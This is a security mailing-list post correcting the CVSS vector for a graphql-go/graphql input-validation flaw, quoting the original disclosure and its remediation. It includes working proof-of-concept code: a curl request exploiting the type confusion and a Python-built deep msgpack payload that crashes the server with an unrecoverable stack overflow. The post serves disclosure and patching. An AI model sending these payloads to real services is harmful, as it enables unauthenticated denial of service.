X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/29/2
Message-ID: <CAK=gNzqbRt+-oQSz1=sto4V5rA7tZTpmW_KSVVxQGi-EfH_7Ag@mail.gmail.com>
Date: Sat, 29 Aug 2026 17:36:08 +0200
From: William Carrier <0x6675636b736f6369617479@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: graphql-go/graphql <= 0.8.1: improper scalar input-type validation -> type confusion and unrecoverable stack-overflow DoS
Content-Type: text/plain; charset=utf-8

Follow-up on *CVE-2026-80051*. The CVE record was published with Attack
Vector AV:L. That is incorrect: the correct Attack Vector is AV:N. Nothing
else changes. The transport gating I described is still there, but it
belongs to Attack Requirements, not to Attack Vector.

There are two consequences of the one root cause (coerceString/coerceBool
accepting a wrong-typed value), and BOTH are network-origin:

  1. Type confusion / improper input validation, unconditional, and
reachable over the most common transport (HTTP + JSON). No special
condition at all.
  2. Process-terminating crash (fmt recursion -> "fatal error: stack
overflow"), reachable when variables arrive through a deserialization path
that does not cap nesting depth. Go's encoding/json AND jsoniter both cap
at depth 10000, whereas the crash needs ~600000; so over vanilla JSON this
half is rejected before it reaches the library. That single fact is exactly
what AT:P already encode. It does not turn a network-delivered payload into
"local access" depth-uncapped transports (msgpack, CBOR, gRPC/protobuf,
message-queue payloads, or variables built programmatically from network
input) are all remote.

In short: the gate is a requirements condition, not a vector one.

Corrected vectors:
  CVSS 4.0:  *AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N*

Both PoCs below run against the published v0.8.1 (Go module proxy) and
speak only over the network.

--------------------------------------------------------------------
PoC A — type confusion over standard HTTP + JSON
--------------------------------------------------------------------
Server (a normal graphql-go HTTP endpoint):

    package main

    import (
        "encoding/json"; "fmt"; "io"; "log"; "net/http"
        "github.com/graphql-go/graphql"
    )
    func main() {
        schema, _ := graphql.NewSchema(graphql.SchemaConfig{
            Query: graphql.NewObject(graphql.ObjectConfig{Name: "Query",
                Fields: graphql.Fields{"echo": &graphql.Field{
                    Type: graphql.String,
                    Args: graphql.FieldConfigArgument{"n":
&graphql.ArgumentConfig{Type: graphql.String}},
                    Resolve: func(p graphql.ResolveParams) (interface{},
error) {
                        return fmt.Sprintf("resolver got Go type=%T",
p.Args["n"]), nil
                    }}}})})
        http.HandleFunc("/graphql", func(w http.ResponseWriter, r
*http.Request) {
            b, _ := io.ReadAll(r.Body)
            var q struct{ Query string `json:"query"`; Variables
map[string]interface{} `json:"variables"` }
            if err := json.Unmarshal(b, &q); err != nil {
w.WriteHeader(400); io.WriteString(w, err.Error()); return }
            json.NewEncoder(w).Encode(graphql.Do(graphql.Params{Schema:
schema, RequestString: q.Query, VariableValues: q.Variables}))
        })
        log.Fatal(http.ListenAndServe("127.0.0.1:18104", nil))
    }

Attack; send a JSON OBJECT for a variable declared String:

    curl -s -X POST http://127.0.0.1:18104/graphql -H 'Content-Type:
application/json' \
      -d '{"query":"query($n: String){ echo(n:$n)
}","variables":{"n":{"admin":true,"x":[1,2,3]}}}'

Result: {"data":{"echo":"resolver got Go type=string"}}, no "errors". The
spec (Oct 2021, sec. 3.5) says String "must raise a request error" for a
non-string input; instead the wrong type is accepted and coerced. A remote
request defeated the type check: network vector.

--------------------------------------------------------------------
PoC B — process crash over the network via a depth-uncapped transport
--------------------------------------------------------------------
Same defect, availability impact. Add a msgpack endpoint to the server
above (msgpack, unlike JSON, does not cap nesting depth as used by
RPC/queue/service-mesh-fed GraphQL gateways):

    // import: msgpack "github.com/vmihailenco/msgpack/v5"
    http.HandleFunc("/graphql-msgpack", func(w http.ResponseWriter, r
*http.Request) {
        b, _ := io.ReadAll(r.Body)
        var q struct{ Query string `msgpack:"query"`; Variables
map[string]interface{} `msgpack:"variables"` }
        if err := msgpack.Unmarshal(b, &q); err != nil {
w.WriteHeader(400); io.WriteString(w, err.Error()); return }
        graphql.Do(graphql.Params{Schema: schema, RequestString: q.Query,
VariableValues: q.Variables}) // crashes
    })

Attack (remote) — emit a deep msgpack envelope and POST it:

    python3 - 700000 > body.bin <<'PY'
    import sys; d=int(sys.argv[1]); o=bytearray()
    o+=b'\x82\xa5query'; q=b'query($n: String){ echo(n:$n) }'
    o+=b'\xd9'+bytes([len(q)])+q
    o+=b'\xa9variables\x81\xa1n'+(b'\x81\xa1n')*(d-1)+b'\xa4leaf'
    sys.stdout.buffer.write(o)
    PY
    curl -s -X POST http://127.0.0.1:18104/graphql-msgpack \
      -H 'Content-Type: application/msgpack' --data-binary @body.bin

Result: the server process dies mid-request (connection dropped); its
stderr shows

    fatal error: stack overflow
    ...
    fmt.(*pp).handleMethods(...)
    fmt.(*pp).printValue(...)      <- coerceString's fmt.Sprintf("%v",
value), unbounded

A single unauthenticated network request terminates the process; it is a
runtime fatal error, not a panic, so recover() cannot save it.

Regards,
WC

On Tue, Aug 25, 2026 at 10:02 AM First name Last name <
0x6675636b736f6369617479@...il.com> wrote:

> Hello,
>
> This reports a security defect in github.com/graphql-go/graphql (GraphQL
> for Go), affecting all released versions up to and including the latest,
> v0.8.1 (released 2023-04-10). No fixed version exists.
>
> The repository has no private security-reporting channel: GitHub private
> vulnerability reporting is disabled and there is no SECURITY.md. This is
> therefore disclosed publicly. A CVE ID has been requested from MITRE (CNA
> of Last Resort) and is pending.
>
> == Summary ==
>
> graphql-go/graphql does not validate that a scalar variable value matches
> its declared type. The built-in coerceString and coerceBool functions
> (scalars.go) accept input whose type does not match the declared String,
> ID, or Boolean scalar instead of raising the request error the GraphQL
> specification mandates and coerce it anyway. One root cause, two
> consequences:
>
>   1. (primary) Unrecoverable denial of service. For String/ID, a
> non-string value is passed to fmt.Sprintf("%v", value); a deeply nested
> value supplied as a String/ID/Boolean variable drives unbounded recursion
> in the fmt package, producing a Go "fatal error: stack overflow" that
> terminates the process and cannot be caught by recover().
>
>   2. (secondary) Improper input validation / type confusion. A wrong-typed
> value (e.g. a JSON object where String is declared) is accepted with no
> error and the resolver receives its %v string rendering, contrary to the
> spec.
>
> == Affected ==
>
>   Product:  github.com/graphql-go/graphql
>   Versions: all <= v0.8.1 (latest release); no fix available
>   Verified: reproduced against v0.8.1 fetched from the Go module proxy;
> scalars.go is byte-identical between v0.8.1 and current master.
>
> == Details ==
>
> coerceString (scalars.go, v0.8.1 lines 307-315):
>
>     func coerceString(value interface{}) interface{} {
>         if v, ok := value.(*string); ok {
>             if v == nil {
>                 return nil
>             }
>             return *v
>         }
>         return fmt.Sprintf("%v", value)   // accepts ANY type
>     }
>
> The scalar input-validation gate (values.go) treats a value as valid when
> the scalar's ParseValue returns a non-nullish result. For String,
> ParseValue is coerceString, which returns a non-nil string for every
> possible Go value (maps, slices, structs) via the fmt.Sprintf fallback. So
> validation never rejects a wrong type. ID delegates to coerceString and
> inherits this. coerceBool has the analogous defect: unhandled types fall
> through to "return false" (a valid Boolean), and strings are
> JS-truthy-coerced rather than rejected.
>
> For the crash: fmt.Sprintf("%v", value) on a deeply nested
> map[string]interface{} recurses one fmt-internal frame per level
> (fmt.(*pp).printValue / handleMethods). Go's goroutine stack has a hard 1
> GB ceiling, therefore, exceeding it is a runtime fatal error, not a panic,
> and cannot be recovered.
>
> == Specification ==
>
> This violates explicit mandatory ("must") language in the GraphQL
> specification (October 2021 edition, section 3.5, scalar Input Coercion):
>
>   String:  "only valid Unicode string input values are accepted. All other
> input values must raise a request error indicating an incorrect
>            type."
>   Boolean: "only boolean input values are accepted. All other input values
> must raise a request error indicating an incorrect type."
>
> coerceInt and coerceFloat in the same file implement the equivalent rule
> correctly (they type-switch and return nil for other types), which shows
> the String/Boolean/ID behavior is an inconsistency, not an intended design.
>
> == Impact and reachability ==
>
> The primary impact is the process-terminating crash. Its reachability is
> gated by how variables reach the library: the most common transport, an
> HTTP JSON body decoded by Go's standard encoding/json, is NOT vulnerable
> and not marginally. encoding/json caps decoding at nesting depth 10000,
> whereas the crash requires roughly 600000 levels (measured: survives
> 10k/100k/300k, crashes near 600k), a ~60x margin. Realistic exposure is
> therefore via a non-JSON transport (gRPC/protobuf, MessagePack,
> message-queue payloads), variables constructed programmatically rather than
> decoded from a single JSON body, or a JSON decoder configured without a
> depth cap.
>
> The type-confusion half is unconditional but weak as a standalone impact:
> the resolver receives a correctly-typed Go string (the %v rendering), and a
> client could already supply any string to a String argument so the defect
> is the failure to reject the wrong type, not any new injectable content.
> Its concrete risk depends on downstream application code that trusts the
> declared type.
>
> For reference, this library already carries CVE-2022-37315 (CWE-674) for
> an analogous uncontrolled-recursion crash in its SDL type-definition
> parser, a less attacker-facing vector than query variables.
>
> == Proof of concept ==
>
> Both parts use only the library's public API and reproduce against v0.8.1.
>
> Part 1 -- type-confusion (no crash):
>
>     package main
>
>     import (
>         "fmt"
>         "github.com/graphql-go/graphql"
>     )
>
>     func main() {
>         queryType := graphql.NewObject(graphql.ObjectConfig{
>             Name: "Query",
>             Fields: graphql.Fields{
>                 "echo": &graphql.Field{
>                     Type: graphql.String,
>                     Args: graphql.FieldConfigArgument{
>                         "n": &graphql.ArgumentConfig{Type: graphql.String},
>                     },
>                     Resolve: func(p graphql.ResolveParams) (interface{},
> error) {
>                         return fmt.Sprintf("%T / %v", p.Args["n"],
> p.Args["n"]), nil
>                     },
>                 },
>             },
>         })
>         schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query:
> queryType})
>
>         r := graphql.Do(graphql.Params{
>             Schema:        schema,
>             RequestString: `query($n: String){ echo(n:$n) }`,
>             VariableValues: map[string]interface{}{
>                 "n": map[string]interface{}{"admin": true, "x":
> []interface{}{1, 2, 3}},
>             },
>         })
>         // Observed: r.Errors is empty (spec requires a request error).
>         // Resolver received: "string / map[admin:true x:[1 2 3]]"
>         fmt.Printf("errors=%v data=%v\n", r.Errors, r.Data)
>     }
>
> Part 2 -- unrecoverable crash (same schema):
>
>     depth := 1000000
>     var v interface{} = "leaf"
>     for i := 0; i < depth; i++ {
>         v = map[string]interface{}{"n": v}
>     }
>     graphql.Do(graphql.Params{
>         Schema:        schema,
>         RequestString: `query($n: String){ echo(n:$n) }`,
>         VariableValues: map[string]interface{}{"n": v},
>     })
>     // runtime: goroutine stack exceeds 1000000000-byte limit
>     // fatal error: stack overflow
>     //   ... fmt.(*pp).printValue ... fmt.(*pp).handleMethods ...
>
> == Remediation ==
>
> coerceString should accept only string/*string (ID additionally int/float
> per the spec's ID coercion rule) and return nil for other types; coerceBool
> should accept only bool/*bool and return nil otherwise, with no string
> coercion. Returning nil makes the input-validation gate raise the
> spec-mandated request error, which closes BOTH consequences -- a
> wrong-typed value never reaches fmt.Sprintf.
>
> == Credit ==
>
>   William Carrier, independent security researcher.
>

